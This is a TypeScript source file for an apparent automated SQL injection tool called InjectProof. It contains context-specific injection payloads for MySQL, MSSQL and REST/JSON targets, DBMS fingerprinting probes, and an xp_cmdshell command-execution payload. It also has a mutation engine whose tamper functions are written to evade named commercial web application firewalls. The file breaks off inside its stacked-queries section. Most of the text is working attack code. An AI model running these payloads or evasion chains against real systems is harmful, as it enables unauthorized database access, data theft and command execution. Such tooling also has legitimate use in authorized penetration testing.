// InjectProof — Advanced Adaptive SQLi Engine V2
// Context-aware injection with smart mutation, stacked queries,
// second-order detection, cookie/header injection, and multi-encoding chains.


// ============================================================
// TYPES
// ============================================================

export type InjectionContext =
    | 'where-string' | 'where-numeric' | 'where-string-paren1' | 'where-string-paren2' | 'where-string-paren3'
    | 'where-double-quote' | 'where-backtick'
    | 'order-by' | 'order-by-numeric'
    | 'insert-string' | 'insert-numeric' | 'insert-multi-col'
    | 'update-string' | 'update-numeric'
    | 'having' | 'group-by'
    | 'limit' | 'limit-offset'
    | 'like-string' | 'like-paren'
    | 'in-clause' | 'in-clause-numeric'
    | 'subquery-1' | 'subquery-2' | 'subquery-3'
    | 'between' | 'case-when'
    | 'concat-arg' | 'function-arg'
    | 'php-multibyte' | 'php-numeric-juggle'
    | 'mssql-bracket' | 'mssql-exec'
    | 'json-value' | 'rest-path'
    | 'unknown';

export type InjectionVector = 'query' | 'body' | 'cookie' | 'header' | 'json-body' | 'xml-body' | 'path' | 'fragment';
export type TamperChain = Array<(payload: string) => string>;

export interface AdaptiveConfig {
    baseUrl: string;
    method: string;
    paramName: string;
    vector: InjectionVector;
    timeout: number;
    userAgent: string;
    customHeaders?: Record<string, string>;
    authHeaders?: Record<string, string>;
    authCookies?: string;
    maxMutations?: number;
    maxRetries?: number;
    secondOrderUrls?: string[];
    stackedQueriesEnabled?: boolean;
    oobDomain?: string;
}

export interface ContextFingerprint {
    context: InjectionContext;
    closingChars: string;       // e.g. "'" or "')" or ""
    commentStyle: string;       // e.g. "-- -" or "#" or "/*"
    dbms: 'mysql' | 'mssql' | 'postgresql' | 'sqlite' | 'oracle' | 'unknown';
    confidence: number;         // 0-1
    evidence: string;
    phpBackend: boolean;        // detected PHP on backend
    allDetected: ContextFingerprint[]; // all contexts found (for multi-vector)
}

export interface MutationResult {
    payload: string;
    tamperChain: string[];
    succeeded: boolean;
    responseLen: number;
    responseTime: number;
    statusCode: number;
}

// ============================================================
// CONTEXT DETECTION ENGINE V2 — PHP + MySQL/MSSQL Focused
// 30+ SQL contexts with intelligent DBMS fingerprinting
// ============================================================

// ── MySQL Error Patterns (PHP backends: mysql_query, mysqli_query, PDO) ──

const MYSQL_ERRORS = [
    /You have an error in your SQL syntax/i,
    /Warning.*mysql_/i,
    /MySqlException/i,
    /valid MySQL result/i,
    /mysqli_.*expects/i,
    /mysql_num_rows/i,
    /mysql_fetch/i,
    /supplied argument is not a valid MySQL/i,
    /Column count doesn't match/i,
    /Unknown column/i,
    /Table '[\w.]+' doesn't exist/i,
    /Data truncated for column/i,
    /Duplicate entry/i,
    /check the manual that corresponds to your MySQL server version/i,
    /Lost connection to MySQL server/i,
    /Access denied for user/i,
    /SQLSTATE\[42000\]/i,
    /SQLSTATE\[HY000\]/i,
    /PDOException/i,
    /PDO::query/i,
    /Call to.*function.*mysql/i,
    /Uncaught mysqli_sql_exception/i,
];

const MSSQL_ERRORS = [
    /Microsoft.*ODBC.*SQL Server/i,
    /Unclosed quotation mark/i,
    /SQL Server.*Driver/i,
    /Microsoft.*OLE DB.*SQL Server/i,
    /\[Microsoft\]\[SQL Server\]/i,
    /Incorrect syntax near/i,
    /The multi-part identifier .* could not be bound/i,
    /SQLSTATE\[08001\]/i,
    /mssql_query/i,
    /Conversion failed when converting/i,
    /Arithmetic overflow error/i,
    /String or binary data would be truncated/i,
    /Cannot insert duplicate key/i,
    /Invalid object name/i,
    /Invalid column name/i,
    /The column name .* is ambiguous/i,
    /Procedure .* expects parameter/i,
    /ntext.*varchar.*operator/i,
];

const PHP_SIGNATURES = [
    /Warning.*on line \d+/i,
    /Fatal error.*on line \d+/i,
    /Notice.*on line \d+/i,
    /Parse error.*on line \d+/i,
    /<b>Warning<\/b>.*in <b>/i,
    /Call Stack:.*#\d/i,
    /X-Powered-By:.*PHP/i,
    /PHPSESSID/i,
    /\.php\?/i,
    /include_path/i,
];

const ALL_SQL_ERRORS = [...MYSQL_ERRORS, ...MSSQL_ERRORS,
    /PostgreSQL.*ERROR/i, /pg_query/i, /unterminated quoted string/i,
    /ORA-\d{5}/i, /SQLite.*error/i, /sqlite3\.OperationalError/i,
];

// ── Context Probe Definitions ──

interface ContextProbe {
    id: string;
    context: InjectionContext;
    payloads: string[];
    closings: string[];        // possible closing sequences
    commentStyles: string[];   // comment styles to try
    evidence: RegExp[];        // error patterns specific to this context
    weight: number;            // priority weight (higher = try first)
    dbmsHint?: string;         // preferred DBMS for this context
}

const CONTEXT_PROBES_V2: ContextProbe[] = [
    // ═══════════════════════════════════════════════
    // PHP + MySQL: Most common patterns
    // ═══════════════════════════════════════════════

    // 1. WHERE col = 'VALUE' (most common PHP pattern)
    //    PHP: mysql_query("SELECT * FROM users WHERE name='$_GET[name]'")
    {
        id: 'mysql-where-sq',
        context: 'where-string',
        payloads: ["'", "''", "' AND '1'='1", "' AND '1'='2", "' OR '1'='1'-- -", "' OR '1'='1'#"],
        closings: ["'"],
        commentStyles: ['-- -', '#', '-- ', '/*'],
        evidence: MYSQL_ERRORS,
        weight: 100,
        dbmsHint: 'mysql',
    },

    // 2. WHERE col = 'VALUE') — single paren
    //    PHP: mysql_query("SELECT * FROM t WHERE (name='$val')")
    {
        id: 'mysql-where-sq-p1',
        context: 'where-string-paren1',
        payloads: ["')", "') AND ('1'='1", "') AND ('1'='2", "') OR ('1'='1'-- -"],
        closings: ["')"],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 90,
        dbmsHint: 'mysql',
    },

    // 3. WHERE (col = 'VALUE')) — double paren
    //    PHP: mysql_query("SELECT * FROM t WHERE ((cat='$cat'))")
    {
        id: 'mysql-where-sq-p2',
        context: 'where-string-paren2',
        payloads: ["'))", "')) AND (('1'='1", "')) OR (('1'='1'-- -"],
        closings: ["'))"],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 85,
        dbmsHint: 'mysql',
    },

    // 4. WHERE (((col = 'VALUE'))) — triple paren (CMS/framework patterns)
    {
        id: 'mysql-where-sq-p3',
        context: 'where-string-paren3',
        payloads: ["')))", "'))) AND ((('1'='1", "'))) OR ((('1'='1'-- -"],
        closings: ["')))"],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 75,
        dbmsHint: 'mysql',
    },

    // 5. WHERE col = VALUE (numeric, no quotes)
    //    PHP: mysql_query("SELECT * FROM items WHERE id=$_GET[id]")
    {
        id: 'mysql-where-num',
        context: 'where-numeric',
        payloads: ['1 AND 1=1', '1 AND 1=2', '1-0', '1-1', '0+1', '1 OR 1=1', '1 DIV 1', '1 DIV 0'],
        closings: [''],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /Truncated incorrect/i],
        weight: 95,
        dbmsHint: 'mysql',
    },

    // 6. WHERE col = "VALUE" (double-quote — rare but exists in PHP)
    //    PHP: mysql_query('SELECT * FROM t WHERE name="' . $val . '"')
    {
        id: 'mysql-where-dq',
        context: 'where-double-quote',
        payloads: ['"', '""', '" AND "1"="1', '" AND "1"="2', '" OR "1"="1"-- -'],
        closings: ['"'],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 70,
        dbmsHint: 'mysql',
    },

    // 7. WHERE `col` = 'VALUE' (backtick column names — MySQL specific)
    //    PHP: mysql_query("SELECT * FROM `users` WHERE `name`='$val'")
    {
        id: 'mysql-backtick',
        context: 'where-backtick',
        payloads: ['`', '` AND `1`=`1', "' AND 1=1-- -"],
        closings: ['`', "'"],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /Unknown column.*in.*clause/i],
        weight: 60,
        dbmsHint: 'mysql',
    },

    // 8. ORDER BY — numeric sort column
    //    PHP: mysql_query("SELECT * FROM t ORDER BY $_GET[sort]")
    {
        id: 'mysql-orderby-num',
        context: 'order-by-numeric',
        payloads: ['1', '2', '3', '999', '1,2', '1,(SELECT 1)', 'IF(1=1,1,(SELECT 1 FROM information_schema.tables))'],
        closings: [''],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /Unknown column/i, /ORDER BY.*out of range/i],
        weight: 80,
        dbmsHint: 'mysql',
    },

    // 9. ORDER BY — string column name
    //    PHP: mysql_query("SELECT * FROM t ORDER BY $sort ASC")
    {
        id: 'mysql-orderby-str',
        context: 'order-by',
        payloads: ['name ASC', 'name DESC', 'IF(1=1,name,id)', '(SELECT 1 FROM information_schema.tables)'],
        closings: [''],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 75,
        dbmsHint: 'mysql',
    },

    // 10. INSERT INTO ... VALUES('VALUE', ...)
    //     PHP: mysql_query("INSERT INTO log VALUES('$ip', '$ua', now())")
    {
        id: 'mysql-insert',
        context: 'insert-string',
        payloads: ["', '', '')-- -", "', (SELECT version()))-- -", "' + '"],
        closings: ["'"],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /Column count doesn't match/i, /INSERT INTO/i],
        weight: 65,
        dbmsHint: 'mysql',
    },

    // 11. INSERT multi-column: VALUES('v1', 'VALUE', 'v3')
    {
        id: 'mysql-insert-multi',
        context: 'insert-multi-col',
        payloads: ["', '1', '1')-- -", "', '1')-- -", "', '1', '1', '1')-- -"],
        closings: ["'"],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /Column count doesn't match/i],
        weight: 60,
        dbmsHint: 'mysql',
    },

    // 12. UPDATE ... SET col = 'VALUE'
    //     PHP: mysql_query("UPDATE users SET name='$name' WHERE id=$id")
    {
        id: 'mysql-update',
        context: 'update-string',
        payloads: ["' WHERE 1=1-- -", "', name=version()-- -", "', name=(SELECT user())-- -"],
        closings: ["'"],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /UPDATE.*SET/i],
        weight: 65,
        dbmsHint: 'mysql',
    },

    // 13. LIKE '%VALUE%'
    //     PHP: mysql_query("SELECT * FROM t WHERE name LIKE '%$search%'")
    {
        id: 'mysql-like',
        context: 'like-string',
        payloads: ["%' AND '1'='1", "%' AND '1'='2", "%' AND 1=1-- -", "%' UNION SELECT 1-- -"],
        closings: ["%'"],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /LIKE/i],
        weight: 70,
        dbmsHint: 'mysql',
    },

    // 14. LIKE ('%VALUE%') — parenthesized
    {
        id: 'mysql-like-paren',
        context: 'like-paren',
        payloads: ["%') AND ('1'='1", "%') AND 1=1-- -"],
        closings: ["%')"],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 60,
        dbmsHint: 'mysql',
    },

    // 15. IN ('VALUE', ...)
    //     PHP: $ids = implode("','", $arr); mysql_query("... IN ('$ids')")
    {
        id: 'mysql-in-clause',
        context: 'in-clause',
        payloads: ["') AND ('1'='1", "') OR ('1'='1'-- -", "') UNION SELECT 1-- -"],
        closings: ["')"],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /IN\s*\(/i],
        weight: 65,
        dbmsHint: 'mysql',
    },

    // 16. IN (VALUE, ...) — numeric IN
    {
        id: 'mysql-in-numeric',
        context: 'in-clause-numeric',
        payloads: [') AND (1=1', ') OR (1=1', ') UNION SELECT 1-- -'],
        closings: [')'],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 55,
        dbmsHint: 'mysql',
    },

    // 17. LIMIT VALUE — PHP pagination
    //     PHP: mysql_query("SELECT * FROM t LIMIT $_GET[offset], $_GET[limit]")
    {
        id: 'mysql-limit',
        context: 'limit',
        payloads: ['1 PROCEDURE ANALYSE()', '1 INTO OUTFILE "/tmp/x"-- -', '1; SELECT 1-- -'],
        closings: [''],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /PROCEDURE.*ANALYSE/i, /OUTFILE/i],
        weight: 50,
        dbmsHint: 'mysql',
    },

    // 18. LIMIT x OFFSET VALUE
    {
        id: 'mysql-offset',
        context: 'limit-offset',
        payloads: ['0 UNION SELECT 1-- -', '0; SELECT version()-- -'],
        closings: [''],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 45,
        dbmsHint: 'mysql',
    },

    // 19. HAVING
    //     PHP: mysql_query("SELECT * FROM t GROUP BY cat HAVING count(*) > $val")
    {
        id: 'mysql-having',
        context: 'having',
        payloads: ["' HAVING 1=1-- -", " HAVING 1=1-- -", "' AND 1=1 GROUP BY 1 HAVING 1=1-- -"],
        closings: ["'", ''],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /HAVING/i, /aggregate/i, /Invalid use of group function/i],
        weight: 50,
        dbmsHint: 'mysql',
    },

    // 20. GROUP BY VALUE
    {
        id: 'mysql-groupby',
        context: 'group-by',
        payloads: ['1 HAVING 1=1-- -', '1,(SELECT version())-- -'],
        closings: [''],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 45,
        dbmsHint: 'mysql',
    },

    // 21. BETWEEN a AND VALUE
    {
        id: 'mysql-between',
        context: 'between',
        payloads: ["1 AND 1=1-- -", "' AND '1'='1'-- -", "100 OR 1=1-- -"],
        closings: ['', "'"],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 40,
        dbmsHint: 'mysql',
    },

    // 22. CONCAT(..., VALUE, ...) or function argument
    //     PHP: mysql_query("SELECT CONCAT(name, '$sep', email) FROM t")
    {
        id: 'mysql-concat',
        context: 'concat-arg',
        payloads: ["'), version(), ('", "', version(), '"],
        closings: ["'"],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 35,
        dbmsHint: 'mysql',
    },

    // ═══════════════════════════════════════════════
    // PHP + MySQL: Advanced / Bypass Patterns
    // ═══════════════════════════════════════════════

    // 23. PHP addslashes() bypass via GBK/Big5 multibyte
    //     When addslashes escapes ' to \' but charset is GBK, 0xbf27 becomes valid char + '
    {
        id: 'php-multibyte-bypass',
        context: 'php-multibyte',
        payloads: ["\xbf' OR 1=1-- -", "\xbf\x27 OR 1=1-- -", "%bf%27 OR 1=1-- -", "%bf' OR 1=1-- -"],
        closings: ["\xbf'", "%bf'"],
        commentStyles: ['-- -', '#'],
        evidence: [...MYSQL_ERRORS, /GBK/i, /SET NAMES/i],
        weight: 55,
        dbmsHint: 'mysql',
    },

    // 24. PHP numeric type juggling
    //     PHP: mysql_query("... WHERE id=" . (int)$_GET['id'])
    //     If cast fails: (int)"1 OR 1=1" = 1, but raw concat doesn't cast
    {
        id: 'php-numeric-juggle',
        context: 'php-numeric-juggle',
        payloads: ['1e0', '0x31', '1 OR 1', '1 AND 1=1', '1 RLIKE 1', '1-(IF(1=1,0,1))'],
        closings: [''],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 50,
        dbmsHint: 'mysql',
    },

    // 25. CASE WHEN context — conditional injection
    {
        id: 'mysql-case-when',
        context: 'case-when',
        payloads: ["' THEN 1 ELSE 0 END-- -", "1 THEN (SELECT version()) ELSE 1 END-- -"],
        closings: ["'", ''],
        commentStyles: ['-- -', '#'],
        evidence: MYSQL_ERRORS,
        weight: 30,
        dbmsHint: 'mysql',
    },

    // ═══════════════════════════════════════════════
    // MSSQL-Specific Contexts
    // ═══════════════════════════════════════════════

    // 26. MSSQL WHERE string
    {
        id: 'mssql-where-string',
        context: 'where-string',
        payloads: ["'", "' AND '1'='1", "' AND '1'='2", "' OR '1'='1'-- "],
        closings: ["'"],
        commentStyles: ['-- ', '--', '/*'],
        evidence: MSSQL_ERRORS,
        weight: 95,
        dbmsHint: 'mssql',
    },

    // 27. MSSQL WHERE col = 'VALUE') — paren
    {
        id: 'mssql-where-paren',
        context: 'where-string-paren1',
        payloads: ["')", "') AND ('1'='1", "') OR ('1'='1'-- "],
        closings: ["')"],
        commentStyles: ['-- ', '/*'],
        evidence: MSSQL_ERRORS,
        weight: 85,
        dbmsHint: 'mssql',
    },

    // 28. MSSQL bracket notation: WHERE [col] = 'VALUE'
    {
        id: 'mssql-bracket',
        context: 'mssql-bracket',
        payloads: ["]-- ", "] AND [x]=[x", "' AND 1=1-- "],
        closings: ["]", "'"],
        commentStyles: ['-- ', '/*'],
        evidence: [...MSSQL_ERRORS, /Invalid column/i],
        weight: 50,
        dbmsHint: 'mssql',
    },

    // 29. MSSQL EXEC context (stored procedures)
    //     ASP/PHP: mssql_query("EXEC sp_search @term='$val'")
    {
        id: 'mssql-exec',
        context: 'mssql-exec',
        payloads: ["'; EXEC xp_cmdshell 'whoami'-- ", "'; WAITFOR DELAY '0:0:3'-- "],
        closings: ["'"],
        commentStyles: ['-- ', '/*'],
        evidence: [...MSSQL_ERRORS, /xp_cmdshell/i, /sp_configure/i],
        weight: 55,
        dbmsHint: 'mssql',
    },

    // 30. MSSQL numeric WHERE
    {
        id: 'mssql-where-num',
        context: 'where-numeric',
        payloads: ['1 AND 1=1', '1 AND 1=2', '1-0', '1; SELECT 1-- '],
        closings: [''],
        commentStyles: ['-- ', '/*'],
        evidence: MSSQL_ERRORS,
        weight: 90,
        dbmsHint: 'mssql',
    },

    // ═══════════════════════════════════════════════
    // JSON / REST API Contexts
    // ═══════════════════════════════════════════════

    // 31. JSON body value: {"field": "VALUE"}
    {
        id: 'json-value',
        context: 'json-value',
        payloads: ["' OR '1'='1", "1 OR 1=1", "\\' OR \\'1\\'=\\'1"],
        closings: ["'", ''],
        commentStyles: ['-- -', '#'],
        evidence: ALL_SQL_ERRORS,
        weight: 40,
    },

    // 32. REST path parameter: /api/users/VALUE
    {
        id: 'rest-path',
        context: 'rest-path',
        payloads: ["1 OR 1=1", "1' OR '1'='1", "1;SELECT 1"],
        closings: ["'", ''],
        commentStyles: ['-- -', '#'],
        evidence: ALL_SQL_ERRORS,
        weight: 35,
    },
];

// ── Smart DBMS Fingerprinting during context detection ──

interface DbmsProbe {
    payload: string;
    dbms: 'mysql' | 'mssql' | 'postgresql' | 'sqlite' | 'oracle';
    check: (res: AdaptiveResponse) => boolean;
}

const DBMS_FINGERPRINT_PROBES: DbmsProbe[] = [
    // MySQL-specific functions
    { payload: "' AND EXTRACTVALUE(1,1)-- -", dbms: 'mysql', check: r => MYSQL_ERRORS.some(e => e.test(r.body)) },
    { payload: "' AND CONNECTION_ID()-- -", dbms: 'mysql', check: r => !MSSQL_ERRORS.some(e => e.test(r.body)) && !(/syntax error/i.test(r.body)) },
    { payload: "' AND SLEEP(0)-- -", dbms: 'mysql', check: r => r.statusCode < 500 && r.time < 1500 },

    // MSSQL-specific
    { payload: "' AND @@TRANCOUNT=0-- ", dbms: 'mssql', check: r => MSSQL_ERRORS.some(e => e.test(r.body)) || r.statusCode < 500 },
    { payload: "' AND LEN('a')=1-- ", dbms: 'mssql', check: r => r.statusCode < 500 },

    // PostgreSQL-specific
    { payload: "' AND LENGTH('a')=1-- -", dbms: 'postgresql', check: r => /PostgreSQL|pg_/i.test(r.body) },

    // SQLite-specific
    { payload: "' AND TYPEOF(1)='integer'-- -", dbms: 'sqlite', check: r => /SQLite/i.test(r.body) || r.statusCode < 500 },
];

export async function detectContext(config: AdaptiveConfig): Promise<ContextFingerprint> {
    const results: ContextFingerprint[] = [];

    // ── Phase 0: Detect PHP backend ──
    let phpDetected = false;
    const baselineRes = await sendAdaptive(config, 'IPF_BASELINE_7x');
    if (baselineRes) {
        phpDetected = PHP_SIGNATURES.some(p => p.test(baselineRes.body)) ||
            (baselineRes.headers['x-powered-by']?.includes('PHP') ?? false) ||
            (baselineRes.headers['set-cookie']?.includes('PHPSESSID') ?? false);
    }

    // ── Phase 1: Error-based probe for each context ──
    // Sort by weight (try most common PHP patterns first)
    const sortedProbes = [...CONTEXT_PROBES_V2].sort((a, b) => b.weight - a.weight);

    for (const probe of sortedProbes) {
        let score = 0;
        let bestEvidence = '';
        let detectedDbms: 'mysql' | 'mssql' | 'postgresql' | 'sqlite' | 'oracle' | 'unknown' = 'unknown';

        // Send each probe payload
        for (const payload of probe.payloads) {
            const res = await sendAdaptive(config, payload);
            if (!res) continue;

            // Check for SQL error patterns
            for (const ev of probe.evidence) {
                if (ev.test(res.body)) {
                    score += 0.25;
                    bestEvidence = res.body.match(ev)?.[0] || bestEvidence;
                }
            }

            // DBMS identification from errors
            if (MYSQL_ERRORS.some(e => e.test(res.body))) { detectedDbms = 'mysql'; score += 0.15; }
            else if (MSSQL_ERRORS.some(e => e.test(res.body))) { detectedDbms = 'mssql'; score += 0.15; }

            // PHP signature bonus
            if (PHP_SIGNATURES.some(p => p.test(res.body))) { phpDetected = true; score += 0.1; }

            // Status code anomaly (500 = likely hit SQL error)
            if (res.statusCode === 500) score += 0.1;

            // Early break if high confidence
            if (score >= 0.7) break;
        }

        // ── Phase 2: Boolean confirmation (true/false pair) ──
        for (const closing of probe.closings) {
            for (const comment of probe.commentStyles) {
                const truePayload = closing
                    ? `${closing} AND 1=1${comment}`
                    : `1 AND 1=1${comment}`;
                const falsePayload = closing
                    ? `${closing} AND 1=2${comment}`
                    : `1 AND 1=2${comment}`;

                const [trueRes, falseRes] = await Promise.all([
                    sendAdaptive(config, truePayload),
                    sendAdaptive(config, falsePayload),
                ]);

                if (trueRes && falseRes) {
                    const lenDiff = Math.abs(trueRes.body.length - falseRes.body.length);
                    const statusDiff = trueRes.statusCode !== falseRes.statusCode;
                    const timeDiff = Math.abs(trueRes.time - falseRes.time);

                    if (lenDiff > 20) score += 0.3;
                    if (statusDiff) score += 0.25;
                    if (lenDiff > 200) score += 0.1;       // large diff = very confident
                    if (timeDiff > 500) score += 0.05;      // timing anomaly

                    if (score > 0.3) {
                        // Found a working closing+comment combo
                        results.push({
                            context: probe.context,
                            closingChars: closing,
                            commentStyle: comment,
                            dbms: detectedDbms !== 'unknown' ? detectedDbms : (probe.dbmsHint as any || 'unknown'),
                            confidence: Math.min(score, 1),
                            evidence: bestEvidence,
                            phpBackend: phpDetected,
                            allDetected: [],
                        });
                        break; // found working combo for this probe
                    }
                }
            }
            if (results.length > 0 && results[results.length - 1].context === probe.context) break;
        }

        // If error-only detection (no boolean pair needed)
        if (score >= 0.5 && !results.some(r => r.context === probe.context)) {
            results.push({
                context: probe.context,
                closingChars: probe.closings[0] || '',
                commentStyle: probe.commentStyles[0] || '-- -',
                dbms: detectedDbms !== 'unknown' ? detectedDbms : (probe.dbmsHint as any || 'unknown'),
                confidence: Math.min(score, 1),
                evidence: bestEvidence,
                phpBackend: phpDetected,
                allDetected: [],
            });
        }
    }

    // ── Phase 3: DBMS fingerprinting on top result ──
    if (results.length > 0 && results[0].dbms === 'unknown') {
        for (const fp of DBMS_FINGERPRINT_PROBES) {
            const res = await sendAdaptive(config, fp.payload);
            if (res && fp.check(res)) {
                results[0].dbms = fp.dbms;
                break;
            }
        }
    }

    // Sort by confidence, attach all detected contexts
    results.sort((a, b) => b.confidence - a.confidence);
    const all = [...results];
    if (results.length > 0) {
        results[0].allDetected = all;
    }

    return results[0] || {
        context: 'unknown',
        closingChars: "'",
        commentStyle: '-- -',
        dbms: phpDetected ? 'mysql' : 'unknown', // PHP usually = MySQL
        confidence: 0,
        evidence: '',
        phpBackend: phpDetected,
        allDetected: [],
    };
}

// ============================================================
// SMART MUTATION ENGINE
// When a payload is blocked by WAF, auto-mutate and retry
// ============================================================

const TAMPER_FUNCTIONS: Array<{ name: string; fn: (p: string) => string; targets: string[] }> = [
    // Space replacements
    { name: 'space→comment', fn: p => p.replace(/ /g, '/**/'), targets: ['all'] },
    { name: 'space→tab', fn: p => p.replace(/ /g, '\t'), targets: ['all'] },
    { name: 'space→%0a', fn: p => p.replace(/ /g, '%0a'), targets: ['all'] },
    { name: 'space→%0d%0a', fn: p => p.replace(/ /g, '%0d%0a'), targets: ['all'] },
    { name: 'space→+', fn: p => p.replace(/ /g, '+'), targets: ['all'] },
    { name: 'space→%09', fn: p => p.replace(/ /g, '%09'), targets: ['all'] },
    { name: 'space→parentheses', fn: p => p.replace(/ AND /gi, ')AND(').replace(/ OR /gi, ')OR('), targets: ['all'] },

    // Keyword obfuscation
    { name: 'inline-comment-50000', fn: p => p.replace(/SELECT/gi, '/*!50000SELECT*/').replace(/UNION/gi, '/*!50000UNION*/').replace(/FROM/gi, '/*!50000FROM*/'), targets: ['mysql'] },
    {
        name: 'inline-comment-random', fn: p => {
            const v = Math.floor(Math.random() * 50000 + 10000);
            return p.replace(/SELECT/gi, `/*!${v}SELECT*/`).replace(/UNION/gi, `/*!${v}UNION*/`);
        }, targets: ['mysql']
    },
    { name: 'case-alternation', fn: p => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(''), targets: ['all'] },
    { name: 'keyword-split', fn: p => p.replace(/UNION/gi, 'UNI%6fN').replace(/SELECT/gi, 'SEL%65CT'), targets: ['all'] },
    { name: 'concat-keywords', fn: p => p.replace(/UNION SELECT/gi, "UNION%0aSELECT").replace(/ORDER BY/gi, "ORDER%0aBY"), targets: ['all'] },

    // Quote bypass
    { name: 'quote→hex', fn: p => p.replace(/'([^']+)'/g, (_, s) => '0x' + Buffer.from(s).toString('hex')), targets: ['mysql', 'mssql'] },
    { name: 'quote→char', fn: p => p.replace(/'([^']{1,20})'/g, (_, s: string) => `CHAR(${[...s].map(c => c.charCodeAt(0)).join(',')})`), targets: ['mysql'] },
    { name: 'quote→chr-concat', fn: p => p.replace(/'([^']{1,20})'/g, (_, s: string) => [...s].map(c => `CHR(${c.charCodeAt(0)})`).join('||')), targets: ['postgresql', 'oracle'] },

    // Encoding chains
    { name: 'double-url', fn: p => encodeURIComponent(encodeURIComponent(p)), targets: ['all'] },
    { name: 'unicode-fullwidth', fn: p => p.replace(/'/g, '\uFF07').replace(/"/g, '\uFF02').replace(/ /g, '\u3000'), targets: ['all'] },
    { name: 'mixed-encoding', fn: p => p.replace(/AND/gi, '%41%4e%44').replace(/OR/gi, '%4f%52'), targets: ['all'] },

    // Comment tricks
    { name: 'comment→#', fn: p => p.replace(/-- -/g, '#'), targets: ['mysql'] },
    { name: 'comment→;%00', fn: p => p.replace(/-- -/g, ';%00'), targets: ['all'] },
    { name: 'comment→--+-', fn: p => p.replace(/-- -/g, '--+-'), targets: ['all'] },

    // Advanced: HPP (HTTP Parameter Pollution)
    { name: 'null-byte', fn: p => '%00' + p, targets: ['all'] },
    { name: 'json-wrapper', fn: p => JSON.stringify({ value: p }), targets: ['all'] },

    // Scientific notation bypass for numeric
    { name: 'scientific-notation', fn: p => p.replace(/1=1/g, '1.e0=1.e0').replace(/1=2/g, '1.e0=2.e0'), targets: ['mysql'] },

    // WAF-specific bypasses
    { name: 'akamai-bypass', fn: p => p.replace(/SELECT/gi, 'SE%0bLECT').replace(/UNION/gi, 'UN%0bION').replace(/ /g, '%0b'), targets: ['all'] },
    { name: 'imperva-bypass', fn: p => p.replace(/SELECT/gi, 'SeLeCt').replace(/UNION/gi, '/*!UnIoN*/').replace(/ /g, '/**_**/'), targets: ['all'] },
    { name: 'sucuri-bypass', fn: p => p.replace(/SELECT/gi, "SE/**/LECT").replace(/ FROM /gi, "/*!FROM*/").replace(/ WHERE /gi, "/*!WHERE*/"), targets: ['all'] },
    { name: 'f5-bigip-bypass', fn: p => p.replace(/SELECT/gi, 'SELECT%01').replace(/ /g, '%01'), targets: ['all'] },
];

export async function smartMutate(
    config: AdaptiveConfig,
    basePayload: string,
    dbms: string = 'unknown',
): Promise<MutationResult | null> {
    const maxMutations = config.maxMutations ?? 15;
    const maxRetries = config.maxRetries ?? 3;

    // Step 1: Try plain payload first
    const plain = await sendAdaptive(config, basePayload);
    if (plain && !isWafBlocked(plain)) {
        return { payload: basePayload, tamperChain: ['plain'], succeeded: true, responseLen: plain.body.length, responseTime: plain.time, statusCode: plain.statusCode };
    }

    // Step 2: Identify which tamper functions are relevant for this DBMS
    const applicableTampers = TAMPER_FUNCTIONS.filter(t =>
        t.targets.includes('all') || t.targets.includes(dbms)
    );

    // Step 3: Try single tamper functions
    let tried = 0;
    for (const tamper of applicableTampers) {
        if (tried >= maxMutations) break;
        tried++;

        const mutated = tamper.fn(basePayload);
        if (mutated === basePayload) continue; // no change

        const res = await sendAdaptive(config, mutated);
        if (res && !isWafBlocked(res)) {
            return { payload: mutated, tamperChain: [tamper.name], succeeded: true, responseLen: res.body.length, responseTime: res.time, statusCode: res.statusCode };
        }
    }

    // Step 4: Try chained tampers (2-deep combinations)
    const topTampers = applicableTampers.slice(0, 8); // limit combos
    for (let i = 0; i < topTampers.length && tried < maxMutations; i++) {
        for (let j = i + 1; j < topTampers.length && tried < maxMutations; j++) {
            tried++;
            const chained = topTampers[j].fn(topTampers[i].fn(basePayload));
            if (chained === basePayload) continue;

            const res = await sendAdaptive(config, chained);
            if (res && !isWafBlocked(res)) {
                return {
                    payload: chained,
                    tamperChain: [topTampers[i].name, topTampers[j].name],
                    succeeded: true,
                    responseLen: res.body.length,
                    responseTime: res.time,
                    statusCode: res.statusCode,
                };
            }
        }
    }

    return null; // all mutations blocked
}

function isWafBlocked(res: AdaptiveResponse): boolean {
    if ([403, 406, 429, 503].includes(res.statusCode)) return true;
    if (/blocked|firewall|access.denied|security.violation|waf|captcha|challenge/i.test(res.body)) return true;
    if (res.headers['x-sucuri-id'] || res.headers['x-sucuri-cache']) return true;
    if (res.headers['server']?.includes('AkamaiGHost')) return true;
    if (res.headers['x-cdn']?.includes('Imperva')) return true;
    return false;
}

// ============================================================
// STACKED QUERIES ENGINE
// Execute multiple SQL statements via ; separator
// ============================================================

export interface StackedQueryResult {
    supported: boolean;
    dbms: string;
    evidence: string;
    payload: string;
}

const STACKED_PROBES: Array<{ payload: string; dbms: string; verify: (res: AdaptiveResponse) => boolean }> = [
